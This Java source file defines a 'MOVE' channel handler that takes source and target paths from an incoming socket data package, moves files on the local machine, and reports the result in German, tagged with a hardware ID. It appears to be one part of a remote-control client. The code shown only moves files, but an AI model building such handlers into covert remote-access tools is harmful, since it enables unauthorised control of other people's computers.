package de.dion.socket.localobjects.channel.channels;

import java.io.File;
import java.net.Socket;

import de.dion.socket.localobjects.channel.Channel;
import de.dion.socket.objects.DataPackage;
import de.dion.socket.utils.Crypter;
import de.dion.socket.utils.FileHelper;

public class MOVE extends Channel {

	public MOVE() {
		super("MOVE");
	}

	@Override
	public void onSocketReceive(DataPackage pack) {
		try {
			String current = pack.get(0).toString();
			String from = pack.get(1).toString();
			String to = pack.get(2).toString();
			File ff = getFileFromPath(current, from);
			
			if(!ff.exists() && !ff.getName().contains("*"))
			{
				sendDataPackage(new DataPackage(this.getName(), HWID, "Keine guelltige Datei/Verzeichnis -> " + ff.getCanonicalPath()));
			}
			else
			{
				File ft = getFileFromPath(current, to);
				
				try {
					FileHelper.move(ff, ft);
					sendDataPackage(new DataPackage(this.getName(), HWID, "Datei(en) wurde(n) erfolgreich verschoben"));
				} catch(Exception e) {
					sendDataPackage(new DataPackage(this.getName(), HWID, ff.getName() + " konnte nicht verschoben werden!\n" + e.getLocalizedMessage()));
				}
			}
			
		} catch(Exception e) {
			sendDataPackage(new DataPackage(this.getName(), HWID, "Fehler beim verschieben aufgetraten!\n" + e.getLocalizedMessage()));
		}
	}

}
